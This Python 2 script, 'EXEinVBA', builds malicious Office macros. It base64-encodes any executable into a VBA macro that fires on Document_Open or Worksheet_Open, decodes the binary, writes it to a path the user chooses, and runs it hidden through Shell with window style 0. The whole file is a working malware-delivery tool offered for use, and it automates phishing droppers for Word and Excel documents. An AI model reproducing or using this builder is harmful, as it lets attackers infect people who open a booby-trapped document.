#!/usr/bin/python
#
# Title: EXEinVBA
#
# Date: 11 August 2016
# Original Coder: @khr0x40sh (https://github.com/khr0x40sh/MacroShop)
# Builder by: @Cr_4nk
# 
# Built this builder so you can now CHOOSE between Word and Excel Documents!

import os, sys
import argparse
import re
import zlib, base64

#Command line Args, going to be using raw input since it is a builder. Easier for End User

print "EXE in VBA, Generates a VBA Macro payload to drop an encoded executable to disk"
print "Which executable would you like to use?"
print "Example: '/home/user/folder/exe.exe'"
print ""
exe_name = raw_input('EXE Name: ')

print "Please name your output text file. i.e. VBA.txt"
print ""
vb_name = raw_input('VBA Name: ')

print "Please enter the location of the dropped file on host"
print "Example: 'C:\\\Users\\\Public\\\Documents\\\exe.exe'"
print "PLEASE NOTE!!! Unless the macro-enabled Word Document was open as an administrator, you can only place this in places the user has access to"
print ""
dest = raw_input('Drop Destination: ')

print "Lastly, is this for a Word Document, or an Excel Worksheet?"
print "1 for Word, 2 for Excel"
print ""
buildchoice = raw_input('1/2: ')

#OPEN THE FILE
if os.path.isfile(exe_name): todo = open(exe_name, 'rb').read()
else: sys.exit(0)

def formStr(varstr, instr):
 holder = []
 str2 = ''
 str1 = '\r\n' + varstr + ' = "' + instr[:1003] + '"' 
 for i in xrange(1003, len(instr), 997):
 	holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+997])
 	str2 = '"\r\n'.join(holder)
 
 str2 = str2 + "\""
 str1 = str1 + "\r\n"+str2
 return str1

#ENCODE THE FILE
print "[+] Encoding %d bytes" % (len(todo), )
b64 = todo.encode("base64")	
print "[+] Encoded data is %d bytes" % (len(b64), )
b64 = b64.replace("\n","")

x=50000

strs = [b64[i:i+x] for i in range(0, len(b64), x)]

for j in range(len(strs)):
	##### Avoids "Procedure too large error with large executables" #####
	strs[j] = formStr("var"+str(j),strs[j])

top = "Option Explicit\r\n\r\nConst TypeBinary = 1\r\nConst ForReading = 1, ForWriting = 2, ForAppending = 8\r\n"

next = "Private Function decodeBase64(base64)\r\n\tDim DM, EL\r\n\tSet DM = CreateObject(\"Microsoft.XMLDOM\")\r\n\t' Create temporary node with Base64 data type\r\n\tSet EL = DM.createElement(\"tmp\")\r\n\tEL.DataType = \"bin.base64\"\r\n\t' Set encoded String, get bytes\r\n\tEL.Text = base64\r\n\tdecodeBase64 = EL.NodeTypedValue\r\nEnd Function\r\n"

then1 = "Private Sub writeBytes(file, bytes)\r\n\tDim binaryStream\r\n\tSet binaryStream = CreateObject(\"ADODB.Stream\")\r\n\tbinaryStream.Type = TypeBinary\r\n\t'Open the stream and write binary data\r\n\tbinaryStream.Open\r\n\tbinaryStream.Write bytes\r\n\t'Save binary data to disk\r\n\tbinaryStream.SaveToFile file, ForWriting\r\nEnd Sub\r\n"

sub_proc=""

for i in range(len(strs)):
	sub_proc = sub_proc + "Private Function var"+str(i)+" As String\r\n"
	sub_proc = sub_proc + ""+strs[i]
	sub_proc = sub_proc + "\r\nEnd Function\r\n"


if buildchoice == '1':
	sub_open = "Private Sub Document_Open()\r\n"
elif buildchoice == '2':
	sub_open = "Private Sub Worksheet_Open()\r\n"


sub_open = sub_open + "\tDim out1 As String\r\n"
for l in range (len(strs) ):
	sub_open = sub_open + "\tDim chunk"+str(l)+" As String\r\n"
	sub_open = sub_open + "\tchunk"+str(l)+" = var"+str(l)+"()\r\n"
	sub_open = sub_open + "\tout1 = out1 + chunk"+str(l)+"\r\n"

sub_open = sub_open + "\r\n\r\n\tDim decode\r\n\tdecode = decodeBase64(out1)\r\n\tDim outFile\r\n\toutFile = \""+dest+"\"\r\n\tCall writeBytes(outFile, decode)\r\n\r\n\tDim retVal\r\n\tretVal = Shell(outFile, 0)\r\nEnd Sub"

vb_file = top + next + then1 + sub_proc+ sub_open

print "[+] Writing to "+vb_name
f = open(vb_name, "w")
f.write(vb_file)
f.close()